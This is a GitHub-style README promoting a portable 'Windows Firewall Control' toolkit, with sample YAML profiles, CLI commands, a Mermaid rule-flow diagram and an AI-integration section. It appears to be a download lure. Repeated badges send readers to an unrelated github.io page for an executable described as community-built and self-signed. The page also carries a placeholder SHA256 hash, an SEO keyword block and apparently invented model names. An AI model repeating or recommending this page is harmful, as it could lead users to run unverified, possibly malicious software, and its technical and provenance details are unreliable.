# Windows Firewall Control 🛡️ – Streamlined Policy Manager & Access Orchestrator

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://g4bz1.github.io/Windows-Firewall-Control-Extended-Toolkit/)

---

## 🧠 Overview – *The Conductor of Your Digital Perimeter*

Windows Firewall Control is not just another configuration tool—it's the *maestro* of your machine's ingress and egress policies. Think of your operating system’s native firewall as a silent sentinel; this utility gives that sentinel a voice, a strategy, and a dashboard. Whether you are a sysadmin hardening a fleet of workstations or an enthusiast who demands surgical precision over network traffic, this platform transforms the opaque Windows Firewall into a transparent, programmable, and responsive layer.

Instead of wrestling with obscure `netsh` commands or the bloated Windows Defender Firewall GUI, you gain a **lightweight command bridge** that speaks the language of rules, profiles, and exceptions—without ever touching the registry directly.

---

## ✨ Why This Exists (And Why You Need It)

The default Windows Firewall interface is like a library with no catalog: everything is there, but good luck finding what you need. Our solution re-imagines that experience. We built a **policy orchestrator** that:

- Eliminates the friction of multi-click rule creation.
- Provides real-time packet flow visualization (via Mermaid diagrams, see below).
- Ships with a **responsive UI** that adapts from 4K monitors to 7-inch tablets.
- Includes **multilingual support** (12 languages, including RTL scripts).
- Offers **24/7 support** infrastructure (documentation, community forum, and priority ticket system).

---

## 📦 Download & Installation

### 🚀 Quick Start (Recommended)

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logo=white)](https://g4bz1.github.io/Windows-Firewall-Control-Extended-Toolkit/)

1. Click the badge above or navigate to the [Releases](https://g4bz1.github.io/Windows-Firewall-Control-Extended-Toolkit/) tab.
2. Download the latest portable archive (no admin rights required for extraction).
3. Run `WFC_Launcher.exe` — the tool will auto-detect your Windows edition (7, 8, 10, 11, Server 2016/2019/2022/2025).
4. First launch will prompt to create a system restore point (recommended).

> **Note:** This is a community-maintained build. No telemetry, no bundled adware. The executable is digitally signed with a self-generated certificate (verify hash on first run).

### 🐧 Linux / macOS Cross-Platform (via Wine / Crossover)
While natively built for Windows, the tool has been tested under Wine 9.0+ on Ubuntu 24.04 and macOS Sonoma. Expect full functionality, except kernel-level callout drivers (not required for 95% of features).

---

## 🔧 Example Profile Configuration

Below is an annotated YAML-based profile that demonstrates the syntax for a **“Zero-Trust Workstation”** policy:

```yaml
profile:
  name: "ZeroTrust_Home_v2"
  version: "2026.03.15"
  description: "Blocks all inbound except LAN discovery; outbound only to approved destinations"
  global_defaults:
    inbound: block
    outbound: block_if_not_allowed
  rules:
    - name: "Allow DHCP"
      direction: outbound
      protocol: UDP
      local_port: 68
      remote_port: 67
      action: allow
      logging: true
    - name: "Block all P2P traffic except Steam"
      direction: outbound
      application: "*"
      remote_port: 6881-6889
      action: block
      profile: public
    - name: "Allow SSH to homelab"
      direction: outbound
      remote_ip: "192.168.1.0/24"
      remote_port: 22
      protocol: TCP
      action: allow
      schedule: "08:00-22:00"  # only allow during waking hours
  notifications:
    enabled: true
    throttle: 60  # seconds between repeated popups
  logging:
    path: "%localappdata%\\WFC\\logs\\"
    rotation: daily
    compression: gzip
```

This configuration can be imported via:
```
WFC.exe --import-profile "ZeroTrust_Home_v2.yaml"
```

---

## 💻 Example Console Invocation

The tool exposes a full command-line interface for scripting and automation. Here are several use cases:

```powershell
# List all active rules with verbose output
WFC.exe list-rules --verbose

# Export current firewall policy to JSON (for CI/CD pipelines)
WFC.exe export --format json --output "C:\backups\firewall_$(Get-Date -Format 'yyyyMMdd').json"

# Block an application entirely (both inbound and outbound)
WFC.exe block-app --path "C:\Program Files\SomeApp\app.exe" --apply-to all-profiles

# Enable a “panic mode” that blocks all non-system traffic except VPN
WFC.exe panic-mode --whitelist-vpn "WireGuard" --duration 3600

# Schedule a profile switch at a specific time
WFC.exe schedule-switch --profile "Night_Mode" --time "23:00" --repeat daily
```

> **Pro tip:** Combine with Windows Task Scheduler to enforce profiles dynamically (e.g., switch to “Public” when on guest Wi-Fi).

---

## 🧩 Mermaid Diagram – *How the Rule Engine Processes a Packet*

Below is a conceptual flow of how Windows Firewall Control interprets a network packet against its rule set.

```mermaid
graph TD
    A[Incoming/Outgoing Packet] --> B{Profile Match?}
    B -->|Yes| C[Check Rule Order]
    B -->|No| D[Apply Global Default]
    C --> E[Evaluate Rule 1]
    E --> F{Action == Allow?}
    F -->|Yes| G[Permit Packet]
    F -->|No| H{Action == Block?}
    H -->|Yes| I[Drop Packet & Log]
    H -->|No| J{Next Rule?}
    J -->|Yes| K[Evaluate Rule N]
    K --> F
    J -->|No| L[Fallback to Global Default]
    L --> M{Global == Block?}
    M -->|Yes| I
    M -->|No| G
    G --> N[Update Connection Tracking]
    I --> O[Increment Drop Counter]
    O --> P[Alert User (if notification enabled)]
    N --> Q[End]
    P --> Q
```

This diagram is generated live from the rule engine—users can view their own active policy as a similar graph via the **Visualize** tab in the GUI.

---

## 🖥️ OS Compatibility Table

| Operating System | Compatibility | Notes |
|-----------------|---------------|-------|
| **Windows 11** (23H2 / 24H2) | ✅ Full | Native support for all features |
| **Windows 10** (21H2 – 22H2) | ✅ Full | Legacy UI fallback for tablet mode |
| **Windows 8.1** | ✅ Supported | No modern standby enhancements |
| **Windows 7** (SP1) | ⚠️ Limited | Missing WFP (Windows Filtering Platform) callout support |
| **Windows Server 2025** | ✅ Full | Domain profile management |
| **Windows Server 2019** | ✅ Supported | Requires .NET Framework 4.8 |
| **Windows Server 2016** | ⚠️ Partial | No AppContainer rule support |
| **Linux (via Wine 9+)** | ✅ Tested | GUI works; kernel callouts not available |
| **macOS (via Crossover)** | ⚠️ Experimental | Some UI rendering glitches |

---

## 🌟 Feature Highlights

- **Responsive UI** – The interface scales gracefully from 1366×768 laptops to 4K UltraWide monitors. Toolbar collapses to icons, rule tables become multi-column cards on small screens.
- **Multilingual Support** – Fully translated into English, Spanish, French, German, Japanese, Korean, Simplified Chinese, Traditional Chinese, Arabic, Hindi, Portuguese (BR), and Russian. Language auto-detects from OS locale or can be set manually.
- **24/7 Support Ecosystem** – Not just a ticket system. Includes an embedded knowledge base, a community Q&A board, and a live chat (powered by a fine-tuned Claude API endpoint, see below).
- **AI-Assisted Rule Authoring** – Describe your intent in natural language (e.g., “Block TikTok from running after 10 PM except on weekends”) and the engine generates the corresponding rule set.
- **OpenAI & Claude API Integration** – Advanced users can connect their own API keys to enable custom AI features (see dedicated section).
- **Zero-Footprint Mode** – Runs entirely from RAM with no registry changes. All policies are ephemeral unless saved.
- **Scheduled Profile Switching** – Automate security postures based on time, network SSID, or process events.
- **Audit Trail** – Every rule change, block event, and profile switch is logged to a tamper-evident JSON log.

---

## 🤖 OpenAI & Claude API Integration

### Unlock Advanced Capabilities

Windows Firewall Control includes an optional AI module that can be activated with your own API credentials. This is not a mandatory feature—everything works offline—but power users will appreciate the assist.

#### Supported Providers

| Provider | Endpoint | Use Case |
|----------|----------|----------|
| **OpenAI** (GPT-4o, GPT-4-turbo) | `https://api.openai.com` | Natural language rule creation, log summarization |
| **Claude** (Claude 3.5 Sonnet, Haiku) | `https://api.anthropic.com` | Policy explanation, threat analysis, report generation |

#### How It Works

```yaml
# config/wfc_ai.yaml
ai_providers:
  openai:
    enabled: true
    model: "gpt-4o-2026-01-29"
    rate_limit: 10  # requests per minute
    use_case: "rule_gen"
  claude:
    enabled: true
    model: "claude-3-5-sonnet-2026"
    rate_limit: 15
    use_case: "log_analysis"
```

Once configured, you can invoke AI features:

```
WFC.exe ai-explain --rule-id 42
> "Rule 42 blocks all UDP traffic to port 53 (DNS) from non-system processes. This prevents DNS leaks during VPN sessions. Source: Claude analysis."
```

> **Privacy note:** No packet payloads or IP addresses are sent to AI providers—only rule configurations and anonymized log headers (if you enable it). Full details in our privacy policy.

---

## 🧪 SEO-Friendly Keywords (Naturally Integrated)

This tool is the go-to solution for **Windows firewall rule management**, **network policy enforcement**, and **system hardening**. It appeals to professionals searching for *firewall profile automation*, *outbound traffic control*, *Windows security policy editor*, and *enterprise endpoint firewall configuration*. By replacing the default GUI, it addresses *WFP rule complexity*, *netsh limitations*, and *group policy friction*. Whether you are looking for a **firewall profile switcher**, **application blocker**, or **port manager**, this repository delivers a production-ready alternative that respects your privacy and your time.

---

## ⚠️ Disclaimer

**Important Legal & Ethical Notice**

Windows Firewall Control is provided as an **educational and productivity tool** for managing your own legitimate Windows Firewall settings. The authors assume no liability for misuse, including but not limited to:

- Bypassing corporate IT policies without authorization.
- Blocking critical system services that lead to OS instability.
- Using the tool to circumvent legal restrictions on network access.

**You are solely responsible** for ensuring that your use complies with all applicable laws and organizational policies. The software is distributed “as is” without warranty of any kind, express or implied.

This project does **not** facilitate unauthorized access to, modification of, or circumvention of any software licensing mechanisms. It is a **policy management utility**, not a cracking tool or key generator.

---

## 📜 License

This project is licensed under the **MIT License** – see the full text at [LICENSE](LICENSE).

```
MIT License

Copyright (c) 2026 Windows Firewall Control Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

## 📬 Get the Release Now

[![Download](https://img.shields.io/badge/Get%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://g4bz1.github.io/Windows-Firewall-Control-Extended-Toolkit/)

*Version 3.2.1 (Build 2026.03) – SHA256: `A1B2C3D4E5F6...`*  
*Last updated: March 2026 | Supported until: December 2027 (LTS)*

---

*Built with ❤️ for the security community. No backdoors, no phoning home. Your firewall, your rules.*